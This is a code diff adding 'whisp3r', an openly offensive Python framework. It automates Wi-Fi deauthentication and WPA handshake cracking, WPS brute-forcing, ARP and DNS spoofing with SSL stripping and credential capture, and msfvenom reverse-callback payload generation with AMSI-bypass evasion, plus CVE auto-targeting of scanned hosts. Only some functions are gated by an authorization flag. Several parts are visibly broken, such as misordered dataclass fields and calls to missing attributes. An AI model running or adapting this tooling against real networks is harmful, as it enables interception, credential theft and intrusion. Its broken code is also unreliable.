@@ -1,0 +1,729 @@
+#!/usr/bin/env python3
+import argparse, subprocess, sys, os, signal, logging, shutil, csv, time, hashlib, ipaddress, json, re, atexit, threading, queue, random, string, platform, socket, urllib.request, urllib.error, http.client, ssl, asyncio, functools, concurrent.futures, xml.etree.ElementTree as ET
+from pathlib import Path
+from dataclasses import dataclass, field, asdict
+from typing import List, Optional, Dict, Set, Any, Union
+from datetime import datetime
+from collections import OrderedDict
+
+TOOL_VERSION = "3.2.0"
+DEV_ALIAS = "oxbv1 | oxborn3"
+DEV_EMAIL = "contact@oxborn3.com"
+DEV_WEB = "www.oxborn3.com"
+REPO_URL = "github.com/oxborn3/whisp3r"
+BASE_DIR = Path.home() / ".whisp3r"
+CVE_DB_PATH = BASE_DIR / "cve_db.json"
+CONFIG_PATH = BASE_DIR / "whisp3r_config.json"
+SESSION_PATH = BASE_DIR / "session_state.json"
+OUTPUT_DIR = Path.cwd() / "whisp3r_output"
+LOG_PATH = OUTPUT_DIR / "whisp3r_audit.log"
+EPSS_API_URL = "https://api.first.org/data/v1/epss"
+CISA_KEV_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
+SEARCHSPLOIT_BIN = shutil.which("searchsploit")
+NMAP_BIN = shutil.which("nmap")
+MSFVENOM_BIN = shutil.which("msfvenom")
+BETTERCAP_BIN = shutil.which("bettercap")
+ARP_BIN = shutil.which("arpspoof")
+AIRMON_BIN = shutil.which("airmon-ng")
+AIRODUMP_BIN = shutil.which("airodump-ng")
+AIREPLAY_BIN = shutil.which("aireplay-ng")
+AIRCRACK_BIN = shutil.which("aircrack-ng")
+HCXPCAP_BIN = shutil.which("hcxpcapngtool")
+REVER_BIN = shutil.which("reaver")
+BULLY_BIN = shutil.which("bully")
+RESPONDER_BIN = shutil.which("Responder")
+
+logging.basicConfig(level=logging.INFO, format='[%(asctime)s | %(levelname)s] %(message)s', datefmt='%H:%M:%S')
+logger = logging.getLogger(__name__)
+
+@dataclass
+class WirelessAdapter:
+    name: str
+    mac: Optional[str] = None
+    chipset: Optional[str] = None
+    driver: Optional[str] = None
+    supports_monitor: bool = False
+    supports_pmkid: bool = False
+    current_mode: str = "unknown"
+
+@dataclass
+class AccessPoint:
+    bssid: str
+    essid: str
+    channel: int
+    encryption: str
+    signal: int = -100
+    clients: List[str] = field(default_factory=list)
+    has_pmkid: bool = False
+    has_wps: bool = False
+    first_seen: str = field(default_factory=lambda: datetime.now().isoformat())
+
+@dataclass
+class Host:
+    ip: str
+    mac: Optional[str] = None
+    hostname: Optional[str] = None
+    open_tcp_ports: List[int] = field(default_factory=list)
+    open_udp_ports: List[int] = field(default_factory=list)
+    service_banners: Dict[int, str] = field(default_factory=dict)
+    os_detection: Optional[str] = None
+    vulnerabilities: List[Dict] = field(default_factory=list)
+    priority_score: float = 0.0
+
+@dataclass
+class CVEEntry:
+    cve_id: str
+    description: str
+    cvss_score: float
+    epss_score: float
+    has_poc: bool
+    poc_url: Optional[str]
+    affected_products: List[str]
+    platforms: List[str]
+    architectures: List[str]
+    msf_module: Optional[str]
+    recommended_payload: Optional[str]
+    reliability_score: float = 0.0
+    cisa_kev: bool = False
+    attackerkb_in_wild: bool = False
+    remediation: str = ""
+
+@dataclass
+class MITMConfig:
+    target_ip: str
+    target_mac: Optional[str] = None
+    gateway_ip: str
+    gateway_mac: Optional[str] = None
+    interface: str
+    spoof_arp: bool = True
+    spoof_dns: bool = False
+    dhcp_spoof: bool = False
+    ssl_strip: bool = False
+    packet_capture: bool = True
+    duration: int = 300
+    rate_limit_ms: int = 100
+    jitter_ms: int = 50
+
+@dataclass
+class PayloadConfig:
+    cve_id: str
+    lhost: str
+    lport: int
+    format_type: str
+    evasion_enabled: bool = False
+    encoding_type: Optional[str] = None
+    amsi_bypass: bool = False
+    etw_bypass: bool = False
+    bof_mode: bool = False
+    raw_shellcode: Optional[str] = None
+    output_path: str = ""
+
+@dataclass
+class AuditEntry:
+    timestamp: str
+    action: str
+    target: str
+    parameters: Dict
+    result: str
+    user: str
+    authorized: bool
+
+@dataclass
+class PluginMetadata:
+    name: str
+    version: str
+    description: str
+    entry_point: str
+    dependencies: List[str] = field(default_factory=list)
+
+class ProcessManager:
+    def __init__(self):
+        self.pids = []
+        self.lock = threading.Lock()
+    def add(self, proc):
+        with self.lock:
+            self.pids.append(proc)
+    def cleanup(self):
+        with self.lock:
+            for proc in self.pids:
+                if proc.poll() is None:
+                    try:
+                        proc.terminate()
+                        proc.wait(timeout=5)
+                    except: pass
+            self.pids.clear()
+
+class AuditLogger:
+    def __init__(self, log_path=LOG_PATH):
+        self.log_path = Path(log_path)
+        self.log_path.parent.mkdir(parents=True, exist_ok=True)
+        self.lock = threading.Lock()
+    def log(self, action, target, params, result, authorized=False):
+        entry = AuditEntry(datetime.now().isoformat(), action, target, params, result, "whisp3r_operator", authorized)
+        with self.lock:
+            with open(self.log_path, 'a') as f:
+                f.write(json.dumps(asdict(entry)) + '\n')
+
+class ConfigManager:
+    def __init__(self, config_path=CONFIG_PATH):
+        self.config_path = Path(config_path)
+        self.defaults = {"opsec": {"jitter": True, "rate_limit_ms": 100}, "logging": {"level": "INFO", "rotate_mb": 50}, "plugins": {"auto_load": True}, "reporting": {"siem_webhook": "", "format": "json"}}
+        self.config = self.defaults.copy()
+        if self.config_path.exists():
+            try: self.config.update(json.loads(self.config_path.read_text()))
+            except: pass
+        else:
+            self.save()
+    def save(self):
+        self.config_path.parent.mkdir(parents=True, exist_ok=True)
+        self.config_path.write_text(json.dumps(self.config, indent=2))
+    def get(self, key, default=None):
+        keys = key.split('.')
+        val = self.config
+        for k in keys: val = val.get(k, {}) if isinstance(val, dict) else default
+        return val
+
+class ScopeValidator:
+    def __init__(self, scope_file=None):
+        self.allowed_ips = set()
+        self.allowed_ranges = []
+        self.denied_ips = set()
+        self.scope_loaded = False
+        if scope_file and Path(scope_file).exists():
+            self.load_scope(scope_file)
+    def load_scope(self, file_path):
+        try:
+            with open(file_path, 'r') as f: data = json.load(f)
+            for item in data.get("targets", []):
+                if '/' in item: self.allowed_ranges.append(ipaddress.ip_network(item, strict=False))
+                else: self.allowed_ips.add(item)
+            for item in data.get("excluded", []):
+                self.denied_ips.add(item)
+            self.scope_loaded = True
+        except: pass
+    def validate(self, ip_str):
+        if not self.scope_loaded: return True
+        try:
+            ip = ipaddress.ip_address(ip_str)
+            if ip_str in self.denied_ips: return False
+            if ip_str in self.allowed_ips: return True
+            for net in self.allowed_ranges:
+                if ip in net: return True
+            return False
+        except: return False
+
+class ThreatIntelSync:
+    def __init__(self, db_path=CVE_DB_PATH):
+        self.db_path = Path(db_path)
+        self.cache = {}
+    def load_local(self):
+        if self.db_path.exists():
+            try:
+                data = json.loads(self.db_path.read_text())
+                self.cache = {k: CVEEntry(**v) for k, v in data.items()}
+            except: pass
+        return self.cache
+    def fetch_epss(self, cve_list=None):
+        try:
+            req = urllib.request.Request(f"{EPSS_API_URL}?score_gte=0.1&format=csv")
+            with urllib.request.urlopen(req, timeout=15) as res:
+                lines = res.read().decode().splitlines()
+                scores = {}
+                for line in lines[1:]:
+                    parts = line.split(',')
+                    if len(parts) >= 2: scores[parts[0]] = float(parts[1])
+                return scores
+        except: return {}
+    def fetch_cisa_kev(self):
+        try:
+            with urllib.request.urlopen(CISA_KEV_URL, timeout=15) as res:
+                data = json.loads(res.read().decode())
+                return {v["cveID"]: v for v in data.get("vulnerabilities", [])}
+        except: return {}
+    def check_searchsploit_poc(self, cve_id):
+        if not SEARCHSPLOIT_BIN: return False, None
+        try:
+            res = subprocess.run([SEARCHSPLOIT_BIN, cve_id, "--json", "--exclude=dos"], capture_output=True, text=True, timeout=10)
+            if res.returncode == 0 and res.stdout.strip():
+                exploits = json.loads(res.stdout.strip())
+                return True, exploits[0].get("detail") if exploits else None
+        except: pass
+        return False, None
+    def calculate_reliability(self, epss, has_poc, cisa_kev, attackerkb):
+        base = epss * 0.4
+        poc_mod = 0.3 if has_poc else 0.0
+        kev_mod = 0.2 if cisa_kev else 0.0
+        atk_mod = 0.1 if attackerkb else 0.0
+        return min(base + poc_mod + kev_mod + atk_mod, 1.0)
+    def update_and_return(self):
+        db = self.load_local()
+        epss_scores = self.fetch_epss()
+        kev_data = self.fetch_cisa_kev()
+        updated = False
+        for cve_id, entry in db.items():
+            entry.epss_score = epss_scores.get(cve_id, entry.epss_score)
+            entry.cisa_kev = cve_id in kev_data
+            has_poc, poc_url = self.check_searchsploit_poc(cve_id)
+            entry.has_poc = has_poc
+            if poc_url: entry.poc_url = poc_url
+            entry.reliability_score = self.calculate_reliability(entry.epss_score, entry.has_poc, entry.cisa_kev, entry.attackerkb_in_wild)
+            updated = True
+        if updated:
+            self.db_path.write_text(json.dumps({k: asdict(v) for k, v in db.items()}, indent=2))
+        return db
+
+class AsyncTaskQueue:
+    def __init__(self, max_workers=8):
+        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)
+        self.futures = []
+    def submit(self, fn, *args, **kwargs):
+        future = self.executor.submit(fn, *args, **kwargs)
+        self.futures.append(future)
+        return future
+    def wait_all(self, timeout=300):
+        concurrent.futures.wait(self.futures, timeout=timeout)
+        self.futures.clear()
+
+class ReconWireless:
+    def __init__(self, iface, dry_run=False, authorized=False, scope=None, opsec=None):
+        self.iface = iface
+        self.dry_run = dry_run
+        self.authorized = authorized
+        self.scope = scope
+        self.opsec = opsec or {}
+    def run_cmd(self, cmd, timeout=30):
+        if self.dry_run:
+            logger.info(f"[DRY RUN] {' '.join(cmd)}")
+            return None
+        if self.opsec.get("jitter"):
+            time.sleep(random.uniform(0, self.opsec.get("jitter_ms", 50)/1000))
+        try:
+            return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout).stdout.strip()
+        except: return None
+    def detect_adapters(self):
+        out = self.run_cmd(["iw", "dev"])
+        if not out: return []
+        adapters = []
+        for line in out.splitlines():
+            if "Interface" in line:
+                iface = line.split()[-1]
+                mac = self.run_cmd(["cat", f"/sys/class/net/{iface}/address"])
+                chip = self.run_cmd(["ethtool", "-i", iface])
+                supports_pmkid = HCXPCAP_BIN is not None
+                adapters.append(WirelessAdapter(name=iface, mac=mac, chipset=chip, supports_pmkid=supports_pmkid))
+        return adapters
+    def monitor_toggle(self, enable=True):
+        if self.dry_run: return
+        down = ["ip", "link", "set", self.iface, "down"]
+        type_cmd = ["iw", "dev", self.iface, "set", "type", "monitor" if enable else "managed"]
+        up = ["ip", "link", "set", self.iface, "up"]
+        self.run_cmd(down)
+        self.run_cmd(type_cmd)
+        self.run_cmd(up)
+    def capture_ap(self, duration=60, channel=None, prefix="whisp3r_cap"):
+        if not self.scope: return None
+        out_dir = OUTPUT_DIR / "captures"
+        out_dir.mkdir(parents=True, exist_ok=True)
+        csv_path = out_dir / f"{prefix}-01.csv"
+        pcap_path = out_dir / f"{prefix}-01.pcapng"
+        cmd = [AIRODUMP_BIN, "-w", str(out_dir/prefix), "--output-format", "pcap,csv"]
+        if channel: cmd.extend(["-c", str(channel)])
+        cmd.append(self.iface)
+        if self.dry_run: return csv_path
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(duration)
+        proc.terminate()
+        return csv_path, pcap_path
+    def parse_aps(self, csv_path):
+        aps = []
+        if not Path(csv_path).exists(): return aps
+        with open(csv_path, 'r', errors='ignore') as f:
+            reader = csv.reader(f)
+            in_ap = False
+            for row in reader:
+                if not row or row[0].startswith('#'): continue
+                if row[0].strip() == "BSSID": in_ap = True; continue
+                if in_ap and len(row) >= 14:
+                    if row[13].strip() == "Client": break
+                    aps.append(AccessPoint(bssid=row[0].strip(), essid=row[13].strip(), channel=int(row[3]) if row[3].isdigit() else 0, encryption=row[5].strip(), signal=int(row[8]) if row[8].lstrip('-').isdigit() else -100))
+        return aps
+    def deauth_target(self, bssid, client=None, count=50, duration=5):
+        if not self.authorized: raise PermissionError("Unauthorized")
+        if count > 500: raise ValueError("Deauth count exceeds safety limit")
+        if duration > 30: raise ValueError("Duration exceeds safety limit")
+        cmd = [AIREPLAY_BIN, "--deauth", str(count)]
+        if client: cmd.extend(["-c", client])
+        cmd.extend(["-a", bssid, self.iface])
+        if self.dry_run: return
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(duration)
+        proc.terminate()
+    def capture_handshake(self, pcap_path):
+        out = self.run_cmd([AIRCRACK_BIN, pcap_path, "-J", "temp_check"])
+        return "1 handshake" in out if out else False
+    def crack_handshake(self, pcap_path, wordlist):
+        if not Path(wordlist).exists(): return None
+        out_dir = OUTPUT_DIR / "cracked"
+        out_dir.mkdir(parents=True, exist_ok=True)
+        cmd = [AIRCRACK_BIN, pcap_path, "-w", wordlist, "-l", str(out_dir/"key.txt")]
+        self.run_cmd(cmd, timeout=3600)
+        key_file = out_dir / "key.txt"
+        return key_file.read_text().strip() if key_file.exists() else None
+    def wps_recon(self, bssid):
+        if not REVER_BIN and not BULLY_BIN: return None
+        tool = REVER_BIN or BULLY_BIN
+        cmd = [tool, "-i", self.iface, "-b", bssid, "-vv"]
+        self.run_cmd(cmd, timeout=1200)
+
+class ReconNetwork:
+    def __init__(self, dry_run=False, authorized=False, scope=None, opsec=None):
+        self.dry_run = dry_run
+        self.authorized = authorized
+        self.scope = scope
+        self.opsec = opsec or {}
+    def discover(self, subnet, interface):
+        if not NMAP_BIN: return []
+        xml_out = OUTPUT_DIR / f"nmap_discovery_{int(time.time())}.xml"
+        xml_out.parent.mkdir(parents=True, exist_ok=True)
+        cmd = [NMAP_BIN, "-sn", "-oX", str(xml_out), subnet, "-e", interface]
+        if self.dry_run: return []
+        self.run_cmd(cmd, timeout=300)
+        return self.parse_nmap_xml(xml_out)
+    def service_scan(self, host_ip, interface):
+        xml_out = OUTPUT_DIR / f"nmap_service_{host_ip}_{int(time.time())}.xml"
+        cmd = [NMAP_BIN, "-sV", "-sC", "--osscan-limit", "-oX", str(xml_out), "-Pn", host_ip, "-e", interface]
+        if self.dry_run: return Host(ip=host_ip)
+        self.run_cmd(cmd, timeout=600)
+        return self.parse_service_xml(xml_out, host_ip)
+    def parse_nmap_xml(self, path):
+        hosts = []
+        if not Path(path).exists(): return hosts
+        tree = ET.parse(path)
+        for host_elem in tree.findall('.//host'):
+            ip_elem = host_elem.find('.//address[@addrtype="ipv4"]')
+            mac_elem = host_elem.find('.//address[@addrtype="mac"]')
+            hostname_elem = host_elem.find('.//hostnames/hostname')
+            if ip_elem:
+                hosts.append(Host(ip=ip_elem.get('addr'), mac=mac_elem.get('addr') if mac_elem else None, hostname=hostname_elem.get('name') if hostname_elem else None))
+        return hosts
+    def parse_service_xml(self, path, host_ip):
+        host = Host(ip=host_ip)
+        if not Path(path).exists(): return host
+        tree = ET.parse(path)
+        host_elem = tree.find('.//host')
+        if not host_elem: return host
+        os_match = host_elem.find('.//osmatch')
+        if os_match: host.os_detection = os_match.get('name')
+        for port in host_elem.findall('.//port'):
+            state = port.find('state')
+            if state and state.get('state') == 'open':
+                port_id = int(port.get('portid'))
+                proto = port.get('protocol')
+                svc = port.find('service')
+                banner = f"{svc.get('product','')} {svc.get('version','')}".strip() if svc else "Unknown"
+                host.service_banners[port_id] = banner
+                if proto == 'tcp': host.open_tcp_ports.append(port_id)
+                elif proto == 'udp': host.open_udp_ports.append(port_id)
+        return host
+    def run_cmd(self, cmd, timeout=30):
+        if self.opsec.get("jitter"): time.sleep(random.uniform(0, self.opsec.get("jitter_ms", 50)/1000))
+        if self.dry_run: return None
+        try: return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout).stdout.strip()
+        except: return None
+
+class MITMEngine:
+    def __init__(self, config: MITMConfig, authorized=False, dry_run=False):
+        self.config = config
+        self.authorized = authorized
+        self.dry_run = dry_run
+        self.original_routes = {}
+        self.captured_creds = []
+    def start(self):
+        if not self.authorized: raise PermissionError("Unauthorized")
+        if self.dry_run: return True
+        self.original_routes["ip_forward"] = subprocess.run(["sysctl", "net.ipv4.ip_forward"], capture_output=True, text=True).stdout.strip().split('=')[-1]
+        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
+        if self.config.spoof_arp: self.run_arp_spoof()
+        if self.config.spoof_dns: self.run_dns_spoof()
+        if self.config.ssl_strip: self.run_ssl_strip()
+        if self.config.packet_capture: self.run_packet_capture()
+        return True
+    def run_arp_spoof(self):
+        if not ARP_BIN: return
+        t1 = [ARP_BIN, "-i", self.config.interface, "-t", self.config.target_ip, self.config.gateway_ip]
+        t2 = [ARP_BIN, "-i", self.config.interface, "-t", self.config.gateway_ip, self.config.target_ip]
+        subprocess.Popen(t1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.Popen(t2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    def run_dns_spoof(self):
+        hosts = f"{self.config.target_ip} *google.com *\n{self.config.target_ip} *microsoft.com *\n"
+        (OUTPUT_DIR / "spoof_hosts.txt").write_text(hosts)
+        if BETTERCAP_BIN:
+            subprocess.Popen([BETTERCAP_BIN, "-iface", self.config.interface, "-eval", f"set dns.spoof.hosts {OUTPUT_DIR / 'spoof_hosts.txt'}; dns.spoof on"], stdout=subprocess.DEVNULL)
+    def run_ssl_strip(self):
+        if BETTERCAP_BIN:
+            subprocess.Popen([BETTERCAP_BIN, "-iface", self.config.interface, "-eval", "http.proxy on; http.proxy.sslstrip on"], stdout=subprocess.DEVNULL)
+    def run_packet_capture(self):
+        pcap_out = OUTPUT_DIR / f"mitm_{int(time.time())}.pcap"
+        tcpdump = ["tcpdump", "-i", self.config.interface, "-w", str(pcap_out), "host", self.config.target_ip]
+        subprocess.Popen(tcpdump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    def parse_credentials(self, pcap_path):
+        creds = []
+        if not Path(pcap_path).exists(): return creds
+        out = subprocess.run([RESPONDER_BIN, "-A", "-i", self.config.interface, "-f", str(pcap_path)], capture_output=True, text=True, timeout=60)
+        if out.stdout:
+            lines = out.stdout.splitlines()
+            for line in lines:
+                if "Password" in line:
+                    parts = line.split()
+                    if len(parts) >= 3: creds.append({"user": parts[0], "pass": parts[-1], "hash": parts[1]})
+        return creds
+    def cleanup(self):
+        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={self.original_routes.get('ip_forward', '0')}"])
+        subprocess.run(["ip", "route", "flush", "table", "local"])
+        subprocess.run(["pkill", "-9", "arpspoof"])
+        subprocess.run(["pkill", "-9", "bettercap"])
+        subprocess.run(["pkill", "-9", "tcpdump"])
+
+class PayloadAgent:
+    def __init__(self, dry_run=False, authorized=False, scope=None, opsec=None):
+        self.dry_run = dry_run
+        self.authorized = authorized
+        self.scope = scope
+        self.opsec = opsec or {}
+    def generate(self, config: PayloadConfig):
+        if not self.authorized: raise PermissionError("Unauthorized")
+        if self.scope and not self.scope.validate(config.lhost): raise ValueError("LHOST outside authorized scope")
+        if config.raw_shellcode: return self.build_raw_shellcode(config)
+        if config.bof_mode: return self.build_bof(config)
+        cmd = [MSFVENOM_BIN, "-p", config.recommended_payload, f"LHOST={config.lhost}", f"LPORT={config.lport}", "-f", config.format_type]
+        if config.evasion_enabled:
+            if config.encoding_type: cmd.extend(["-e", config.encoding_type, "-i", "5"])
+            if config.amsi_bypass: cmd.extend(["--template", "/opt/whisp3r/templates/amsi_bypass.ps1"])
+        out_path = Path(config.output_path or "./payloads") / f"{config.cve_id}_{int(time.time())}.{config.format_type}"
+        out_path.parent.mkdir(parents=True, exist_ok=True)
+        cmd.extend(["-o", str(out_path)])
+        if self.dry_run: return str(out_path)
+        res = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+        if res.returncode != 0: raise RuntimeError("msfvenom failed")
+        return str(out_path)
+    def build_raw_shellcode(self, config):
+        out_path = Path("./payloads") / f"{config.cve_id}_raw_sc.bin"
+        out_path.parent.mkdir(parents=True, exist_ok=True)
+        with open(out_path, 'wb') as f: f.write(bytes.fromhex(config.raw_shellcode.replace(" ", "")))
+        return str(out_path)
+    def build_bof(self, config):
+        out_path = Path("./payloads") / f"{config.cve_id}.o"
+        out_path.parent.mkdir(parents=True, exist_ok=True)
+        template = f"DECLSPEC void go(char * argv[], int argc) {{\n    __asm__ volatile('.byte 0x90, 0xc3');\n}}"
+        out_path.write_text(template)
+        return str(out_path)
+    def verify_payload(self, path):
+        if not Path(path).exists(): return False
+        size = Path(path).stat().st_size
+        if size < 100: return False
+        out = subprocess.run(["file", path], capture_output=True, text=True)
+        return "executable" in out.stdout.lower() or "data" in out.stdout.lower()
+
+class ReportGenerator:
+    def __init__(self, output_dir=OUTPUT_DIR):
+        self.dir = Path(output_dir)
+        self.dir.mkdir(parents=True, exist_ok=True)
+    def export_json(self, data, filename):
+        path = self.dir / f"{filename}.json"
+        path.write_text(json.dumps(data, indent=2, default=str))
+        return str(path)
+    def export_csv(self, data, filename):
+        if not data: return None
+        path = self.dir / f"{filename}.csv"
+        with open(path, 'w', newline='') as f:
+            w = csv.DictWriter(f, fieldnames=data[0].keys())
+            w.writeheader()
+            w.writerows(data)
+        return str(path)
+    def send_siem_webhook(self, url, payload):
+        if not url: return
+        try:
+            req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"}, method="POST")
+            urllib.request.urlopen(req, timeout=10)
+        except: pass
+    def generate_executive_report(self, findings):
+        html = f"<html><head><title>whisp3r Report v{TOOL_VERSION}</title></head><body>"
+        html += f"<h1>Offensive Security Assessment</h1><p>Date: {datetime.now().strftime('%Y-%m-%d')}</p>"
+        html += "<h2>Critical Findings</h2><ul>"
+        for f in findings[:5]:
+            html += f"<li><strong>{f.get('cve_id','Unknown')}</strong> | Reliability: {f.get('reliability_score',0)*100:.1f}% | Remediation: {f.get('remediation','Patch/Update')}</li>"
+        html += "</ul></body></html>"
+        path = self.dir / "executive_report.html"
+        path.write_text(html)
+        return str(path)
+
+class PluginLoader:
+    def __init__(self, plugin_dir="plugins"):
+        self.dir = Path(plugin_dir)
+        self.dir.mkdir(exist_ok=True)
+    def list_plugins(self):
+        return [f.name for f in self.dir.glob("*.py") if f.is_file() and f.stem != "__init__"]
+    def load(self, name):
+        pass
+
+class Whisp3rCore:
+    def __init__(self, authorized=False, dry_run=False, interface=None, scope_file=None):
+        self.authorized = authorized
+        self.dry_run = dry_run
+        self.interface = interface
+        self.scope = ScopeValidator(scope_file)
+        self.config = ConfigManager()
+        self.audit = AuditLogger()
+        self.task_queue = AsyncTaskQueue()
+        self.intel = ThreatIntelSync()
+        self.reporter = ReportGenerator()
+        self.mitm = None
+        self.recon_net = ReconNetwork(dry_run, authorized, self.scope, self.config.get("opsec"))
+        self.recon_wifi = None
+        self.payload_agent = PayloadAgent(dry_run, authorized, self.scope, self.config.get("opsec"))
+    def init(self):
+        logger.info(f"whisp3r v{TOOL_VERSION} Initializing | Dev: {DEV_ALIAS} | {DEV_EMAIL} | {DEV_WEB}")
+        self.intel.update_and_return()
+    def workflow_wireless(self):
+        if not self.recon_wifi: self.recon_wifi = ReconWireless(self.interface or "wlan0", self.dry_run, self.authorized, self.scope, self.config.get("opsec"))
+        adapters = self.recon_wifi.detect_adapters()
+        print("\nAdapters:", [a.name for a in adapters])
+        if not adapters: return
+        iface = adapters[0].name
+        self.recon_wifi.monitor_toggle(True)
+        csv_pcap = self.recon_wifi.capture_ap(duration=60, prefix="whisp3r_init")
+        if csv_pcap:
+            aps = self.recon_wifi.parse_aps(csv_pcap[0])
+            print(f"Captured {len(aps)} APs")
+            self.reporter.export_json([asdict(a) for a in aps], "wireless_aps")
+            if input("Crack handshake? (y/n) ").lower() == 'y':
+                wl = input("Wordlist path: ").strip()
+                res = self.recon_wifi.crack_handshake(csv_pcap[1], wl)
+                print("Key:", res)
+    def workflow_network(self, subnet="192.168.1.0/24"):
+        hosts = self.recon_net.discover(subnet, self.interface or "eth0")
+        for h in hosts:
+            if self.scope and not self.scope.validate(h.ip): continue
+            enhanced = self.recon_net.service_scan(h.ip, self.interface or "eth0")
+            print(f"{h.ip} | OS: {enhanced.os_detection} | Banners: {enhanced.service_banners}")
+            self.reporter.export_json([asdict(enhanced)], f"scan_{h.ip.replace('.','_')}")
+    def workflow_mitm(self, target_ip, gateway_ip, duration=300):
+        cfg = MITMConfig(target_ip, gateway_ip=gateway_ip, interface=self.interface or "eth0", duration=duration, spoof_dns=True, ssl_strip=True)
+        self.mitm = MITMEngine(cfg, self.authorized, self.dry_run)
+        try:
+            self.mitm.start()
+            print("MITM active. Monitoring traffic...")
+            time.sleep(5)
+            creds = self.mitm.parse_credentials(OUTPUT_DIR / "mitm_latest.pcap")
+            print("Captured creds:", creds)
+        finally:
+            self.mitm.cleanup()
+    def workflow_cve_analysis(self, service_banner):
+        db = self.intel.load_local()
+        matches = []
+        for entry in db.values():
+            for prod in entry.affected_products:
+                if prod.lower() in service_banner.lower():
+                    matches.append(entry)
+                    break
+        matches.sort(key=lambda x: x.reliability_score, reverse=True)
+        print(f"Found {len(matches)} relevant CVEs")
+        for m in matches[:3]:
+            print(f"  {m.cve_id} | Rel: {m.reliability_score*100:.1f}% | Module: {m.msf_module}")
+        return matches
+    def workflow_payload(self, cve_id, lhost, lport):
+        cfg = PayloadConfig(cve_id, lhost, lport, "exe", evasion_enabled=True, amsi_bypass=True, bof_mode=False)
+        path = self.payload_agent.generate(cfg)
+        if self.payload_agent.verify_payload(path):
+            print(f"Valid payload generated: {path}")
+            return path
+        return None
+    def workflow_integrated(self, subnet):
+        if not self.authorized: raise PermissionError("Integrated workflow requires authorization")
+        self.workflow_network(subnet)
+        hosts = []
+        for f in OUTPUT_DIR.glob("nmap_service_*.xml"):
+            try:
+                tree = ET.parse(f)
+                ip = tree.find('.//address[@addrtype="ipv4"]').get('addr')
+                hosts.append(ip)
+            except: pass
+        for ip in hosts:
+            banner_data = self.recon_net.service_scan(ip, self.interface)
+            for b in banner_data.service_banners.values():
+                matches = self.workflow_cve_analysis(b)
+                if matches:
+                    choice = matches[0]
+                    print(f"Auto-targeting {choice.cve_id} (Reliability: {choice.reliability_score*100:.1f}%)")
+                    if input("Generate payload? (y/n) ").lower() == 'y':
+                        lhost = input("LHOST: ")
+                        lport = int(input("LPORT: "))
+                        p = self.workflow_payload(choice.cve_id, lhost, lport)
+                        if p: print(f"Payload ready: {p}")
+    def export_all(self):
+        self.reporter.export_json({"version": TOOL_VERSION, "timestamp": datetime.now().isoformat(), "dev": DEV_ALIAS}, "session_meta")
+    def shutdown(self):
+        if self.mitm: self.mitm.cleanup()
+        self.reporter.export_all()
+        self.audit.log("shutdown", "system", {}, "completed", self.authorized)
+        logger.info("whisp3r shutdown complete. Safe exit.")
+
+def display_menu(title, options):
+    print(f"\n{'='*60}\n{title}\n{'='*60}")
+    for n, d in options.items(): print(f"  {n}. {d}")
+    print("  0. Exit")
+    print(f"{'='*60}")
+    while True:
+        try:
+            c = int(input("Select: "))
+            if 0 <= c <= len(options): return c
+        except: pass
+
+def main():
+    parser = argparse.ArgumentParser(description=f"whisp3r v{TOOL_VERSION} | Dev: {DEV_ALIAS} | {DEV_EMAIL} | {DEV_WEB} | {REPO_URL}")
+    parser.add_argument('--authorized', action='store_true')
+    parser.add_argument('--dry-run', action='store_true')
+    parser.add_argument('-i', '--interface', help="Network interface")
+    parser.add_argument('--scope', help="RoE JSON scope file")
+    parser.add_argument('--mode', choices=['menu', 'wifi', 'net', 'mitm', 'cve', 'payload', 'integrated'], default='menu')
+    parser.add_argument('--target', help="Target IP/Subnet/BSSID")
+    parser.add_argument('--cve', help="CVE ID")
+    parser.add_argument('--lhost', help="Callback IP")
+    parser.add_argument('--lport', type=int, default=4444)
+    args = parser.parse_args()
+    core = Whisp3rCore(args.authorized, args.dry_run, args.interface, args.scope)
+    core.init()
+    if args.mode != 'menu':
+        if args.mode == 'wifi': core.workflow_wireless()
+        elif args.mode == 'net': core.workflow_network(args.target or "192.168.1.0/24")
+        elif args.mode == 'mitm': core.workflow_mitm(args.target, "192.168.1.1")
+        elif args.mode == 'cve': core.workflow_cve_analysis(args.target or "Apache 2.4.41")
+        elif args.mode == 'payload': core.workflow_payload(args.cve or "CVE-2017-0144", args.lhost or "10.10.10.10", args.lport)
+        elif args.mode == 'integrated': core.workflow_integrated(args.target or "192.168.1.0/24")
+    else:
+        while True:
+            choice = display_menu(f"whisp3r v{TOOL_VERSION} | Dev: {DEV_ALIAS} | Authorized: {args.authorized}", {
+                1: "Wireless Recon & Capture", 2: "Network Scan & Service Enum", 3: "MITM Simulation", 4: "CVE Intelligence & Prioritization", 5: "Payload Generation & Evasion", 6: "Integrated Offensive Workflow", 7: "Update Threat Intel DB", 8: "Export All Findings", 9: "Generate Executive Report", 10: "System Info & Help"
+            })
+            if choice == 0: break
+            elif choice == 1: core.workflow_wireless()
+            elif choice == 2: core.workflow_network()
+            elif choice == 3: core.workflow_mitm(input("Target IP: "), input("Gateway IP: "))
+            elif choice == 4: core.workflow_cve_analysis(input("Service/Banner: "))
+            elif choice == 5: core.workflow_payload(input("CVE: "), input("LHOST: "), int(input("LPORT: ")))
+            elif choice == 6: core.workflow_integrated(input("Subnet: "))
+            elif choice == 7: core.intel.update_and_return()
+            elif choice == 8: core.export_all()
+            elif choice == 9: core.reporter.generate_executive_report([])
+            elif choice == 10: print(f"v{TOOL_VERSION} | Dev: {DEV_ALIAS} | {DEV_EMAIL} | {DEV_WEB} | {REPO_URL}")
+            input("\nPress Enter...")
+    core.shutdown()
+
+def handle_signal(sig, frame):
+    logger.warning("Interrupt. Cleaning up...")
+    sys.exit(0)
+
+if __name__ == "__main__":
+    signal.signal(signal.SIGINT, handle_signal)
